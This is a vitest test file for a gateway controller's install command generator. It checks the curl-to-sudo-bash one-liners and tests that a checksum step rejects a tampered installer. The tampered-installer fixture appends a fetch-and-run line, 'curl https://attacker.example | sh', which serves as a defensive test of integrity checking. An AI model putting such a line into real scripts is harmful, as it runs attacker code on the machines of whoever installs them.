/**
 * The commands an admin pastes into a gateway VM: their exact shape for each
 * kind of controller, and (on POSIX) what the private-CA form actually does
 * in a shell when the installer it downloads is genuine or tampered with.
 */
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { freshDb } from "./helpers";
import { setEnvForTests } from "@/server/env";
import { gatewayCommand, installScript } from "@/server/install-script";

const sha = (s: string | Buffer) => createHash("sha256").update(s).digest("hex");
let dir = "";

beforeEach(() => {
  freshDb();
  dir = mkdtempSync(join(tmpdir(), "opnmesh-cmd-"));
  delete process.env["OPNMESH_CA_FILE"];
});
afterEach(() => {
  delete process.env["OPNMESH_CA_FILE"];
  rmSync(dir, { recursive: true, force: true });
});

function usePrivateCa(url: string): string {
  const file = join(dir, "root.crt");
  writeFileSync(file, "-----BEGIN CERTIFICATE-----\nTEST\n-----END CERTIFICATE-----\n");
  process.env["OPNMESH_CA_FILE"] = file;
  setEnvForTests({ publicUrl: url, insecureHttp: false });
  return sha(readFileSync(file));
}

describe("gateway commands", () => {
  it("lab controller over http: pipe the installer and allow http", () => {
    const c = gatewayCommand({ token: "TOKEN" });
    expect(c.command).toBe("curl -fsSL http://controller.test/install.sh | sudo bash -s -- --token TOKEN --insecure-http");
    expect(c.caFingerprint).toBeNull();
    expect(c.installScriptSha256).toBe(sha(installScript("http://controller.test")));
    expect(gatewayCommand({ upgrade: true }).command).toBe("curl -fsSL http://controller.test/install.sh | sudo bash -s -- --upgrade --insecure-http");
  });

  it("public certificate: TLS verifies the download, so a plain pipe is enough", () => {
    setEnvForTests({ publicUrl: "https://mesh.example.com", insecureHttp: false });
    expect(gatewayCommand({ token: "TOKEN" }).command).toBe("curl -fsSL https://mesh.example.com/install.sh | sudo bash -s -- --token TOKEN");
    expect(gatewayCommand({ upgrade: true }).command).toBe("curl -fsSL https://mesh.example.com/install.sh | sudo bash -s -- --upgrade");
  });

  it("private CA: checks the installer against its checksum before running it", () => {
    const fp = usePrivateCa("https://203.0.113.5");
    const c = gatewayCommand({ token: "TOKEN" });
    expect(c.caFingerprint).toBe(fp);
    expect(c.installScriptSha256).toBe(sha(installScript("https://203.0.113.5")));
    expect(c.command).not.toContain("| sudo bash");
    expect(c.command).toBe(
      `f=$(mktemp) && curl -fsSLk https://203.0.113.5/install.sh -o "$f" && echo "${c.installScriptSha256}  $f" | sha256sum -c --quiet && sudo bash "$f" --token TOKEN --ca-fingerprint ${fp}`,
    );
    expect(gatewayCommand({ upgrade: true }).command).toContain(`sudo bash "$f" --upgrade --ca-fingerprint ${fp}`);
  });

  // The private-CA one-liner, run for real with curl and sudo replaced by
  // stand-ins: the genuine installer runs, a tampered one never does.
  it.skipIf(process.platform === "win32")("private CA one-liner refuses a tampered installer in a real shell", () => {
    usePrivateCa("https://203.0.113.5");
    const c = gatewayCommand({ token: "TOKEN" });
    const bin = join(dir, "bin");
    const served = join(dir, "served.sh");
    const ran = join(dir, "sudo-args");
    mkdirSync(bin, { recursive: true });
    // curl -fsSLk URL -o FILE: copy whatever the "controller" serves.
    writeFileSync(join(bin, "curl"), `#!/bin/sh\nwhile [ $# -gt 0 ]; do [ "$1" = -o ] && cp "${served}" "$2"; shift; done\n`);
    writeFileSync(join(bin, "sudo"), `#!/bin/sh\necho "$@" > "${ran}"\n`);
    chmodSync(join(bin, "curl"), 0o755);
    chmodSync(join(bin, "sudo"), 0o755);
    const run = () => spawnSync("bash", ["-c", c.command], { env: { ...process.env, PATH: `${bin}:${process.env["PATH"]}` }, encoding: "utf8" });

    writeFileSync(served, installScript("https://203.0.113.5"));
    const ok = run();
    expect(ok.status).toBe(0);
    expect(readFileSync(ran, "utf8")).toMatch(/^bash \S+ --token TOKEN --ca-fingerprint [0-9a-f]{64}\n$/);

    rmSync(ran);
    writeFileSync(served, installScript("https://203.0.113.5") + "\ncurl https://attacker.example | sh\n");
    const bad = run();
    expect(bad.status).not.toBe(0);
    expect(existsSync(ran)).toBe(false);
  });
});
